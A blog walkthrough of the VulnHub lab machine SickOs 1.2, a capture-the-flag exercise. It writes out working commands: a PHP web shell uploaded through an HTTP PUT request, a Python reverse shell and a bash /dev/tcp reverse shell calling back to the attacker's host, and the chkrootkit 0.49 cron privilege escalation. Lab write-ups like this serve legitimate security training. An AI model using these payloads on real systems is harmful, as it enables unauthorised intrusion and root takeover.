---
layout: post
title: SickOs 1.2 (VulnHub) - Complete Walkthrough and Guide
subtitle: SickOS 1.2 is a CTF (Capture the Flag) vulnerable machine from VulnHub which objective is to gain the highest privileges on the system.
comments: false
categories:
- WalkThroughs 
tags:
- vulnhub
---

Here is a complete walkthrough and tutorial on how to hack and penetrate SickOs 1.2 of VulnHub.

![SickOs 1.2 VulnHub](https://i.imgur.com/Vg48A3C.jpg){: .mx-auto.d-block :}

**SickOS 1.2 Description:**

SickOS 1.2 is a CTF (Capture the Flag) vulnerable machine from VulnHub which objective is to gain the highest privileges on the system and get the /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt file.

**Author:** [D4rk](https://twitter.com/D4rk36)

**Download:** [VulnHub](https://www.vulnhub.com/entry/sickos-12,144)

### SickOs 1.2 Walkthrough
SickOs 1.2 was found by conducting an Nmap ping sweep.

~~~
nmap -sP 192.168.216.1-254
~~~

![sickos_1-2_screenshot1](https://i.imgur.com/fCLNURz.jpg){: .mx-auto.d-block :}

Doing a quick Nmap scan, it was found that SickOS 1.2 port 22 and port 80 was open.

~~~
nmap -n 192.168.216.128
~~~

![sickos_1-2_screenshot2](https://i.imgur.com/jgotwXr.jpg){: .mx-auto.d-block :}

Browsing to http://192.168.216.128 shows that it was hosting a website.

~~~
http://192.168.216.128
~~~

![sickos_1-2_screenshot3](https://i.imgur.com/Hj1yjL9.jpg){: .mx-auto.d-block :}

**[Wfuzz](http://www.edge-security.com/wfuzz.php)** - a tool for brute-forcing web applications was used to find and brute-force for any directories on SickOS 1.2 website.

Using Wfuzz, a directory named "**test**" was found.

~~~
wfuzz --hc 404 -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://192.168.216.128/FUZZ
~~~

![sickos_1-2_screenshot4](https://i.imgur.com/5Vv0v1T.jpg){: .mx-auto.d-block :}

Browsing to the "**test**" directory showed a directory listing web page and that SickOS 1.2 website was running on **lighttpd/1.4.28**.

~~~
http://192.168.216.128/test/
~~~

![sickos_1-2_screenshot5](https://i.imgur.com/8z3b4ce.jpg){: .mx-auto.d-block :}

Various exploits and vulnerabilities on **lighttpd 1.4.28** was tested, however none of it worked for SickOs 1.2.

Upon checking for HTTP methods available on the directory "**test**" using cURL, it was found that it can be potentially vulnerable to HTTP PUT method exploit.

~~~
curl -v -X OPTIONS http://192.168.216.128/test
~~~

![sickos_1-2_screenshot6"](https://i.imgur.com/HQA45XB.jpg){: .mx-auto.d-block :}

Learning this, SickOS 1.2 was tested if it was possible to create a simple backdoor web shell using the HTTP PUT method exploit.

~~~
curl -v -X PUT -d '&lt;?php system($_GET["cmd"]); ?&gt;' http://192.168.216.128/test/shell.php
~~~

![sickos_1-2_screenshot7](https://i.imgur.com/8H7CPaX.jpg){: .mx-auto.d-block :}

The result shows that SickOS 1.2 was indeed vulnerable to HTTP PUT method exploit.

Browsing to the test directory showed that the webshell was successfully created.

~~~
http://192.168.216.128/test
~~~

![sickos_1-2_screenshot8](https://i.imgur.com/tYsC7uT.jpg){: .mx-auto.d-block :}

The webshell was then tested if it was properly working by reading the "**/etc/passwd**" file of SickOS 1.2.

Seeing the contents of "**/etc/passwd/**" file proves that the web shell wasindeed working.

~~~
http://192.168.216.128/test/shell.php?cmd=cat%20/etc/passwd
~~~

![sickos_1-2_screenshot9](https://i.imgur.com/MzhRP2D.jpg){: .mx-auto.d-block :}

The webshell was then used to run areverse shell Python command while a Netcat was opened to listen for incoming connections. This resulted on gaining a shell with low privilege access.

~~~
nc -nlvp 443

http://192.168.216.128/test/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket%28socket.AF_INET,socket.SOCK_STREAM%29;s.connect%28%28%22192.168.216.129%22,443%29%29;os.dup2%28s.fileno%28%29,0%29;%20os.dup2%28s.fileno%28%29,1%29;%20os.dup2%28s.fileno%28%29,2%29;p=subprocess.call%28[%22/bin/sh%22,%22-i%22]%29;%27
~~~

![sickos_1-2_screenshot10](https://i.imgur.com/gSFdG6U.jpg){: .mx-auto.d-block :}

![sickos_1-2_screenshot11](https://i.imgur.com/dnF1Hwj.jpg){: .mx-auto.d-block :}

The low privilege shell was used to enumerate SickOS 1.2 which resulted on finding that a **Chkrootkit version 0.49** was running on **Crontab** through "**/etc/cron.daily**".

~~~
cd /etc/cron.daily

ls -alF

chkrootkit -V
~~~

![sickos_1-2_screenshot15](https://i.imgur.com/RXqPlna.jpg){: .mx-auto.d-block :}

(https://www.exploit-db.com/exploits/38775) Chkrootkit 0.49 privilege escalation exploit</a> was then used to gain complete administrative access on SickOS 1.2.

A bash script named "**update**" was then created on the "**/tmp**" directory and changed its permissions to **777** to make it executable and remove any permission restriction while a Netcat listener was opened to wait for incoming connections.

~~~
printf '#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/192.168.216.129/443 0&gt;&amp;1\n' &gt;&gt; /tmp/update

chmod 777 /tmp/update

nc -nlvp 443
~~~

![sickos_1-2_screenshot12](https://i.imgur.com/izCgJ4I.jpg){: .mx-auto.d-block :}

After waiting for the Chkrootkit to run via Crontab, the root shell was obtained.

![sickos_1-2_screenshot13](https://i.imgur.com/6YSjFpu.jpg){: .mx-auto.d-block :}

Browsing to the root directory, the target **7d03aaa2bf93d80040f3f22ec6ad9d5a.txt** has been found.

{: .box-success}
7d03aaa2bf93d80040f3f22ec6ad9d5a.txt contents:

{: .box-success}
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

{: .box-success}
Thanks for giving this try.

{: .box-success}
@vulnhub: Thanks for hosting this UP!.

![sickos_1-2_screenshot14](https://i.imgur.com/ka7dCVh.jpg){: .mx-auto.d-block :}

SickOs 1.2 of VulnHub has been successfully hacked and exploited!
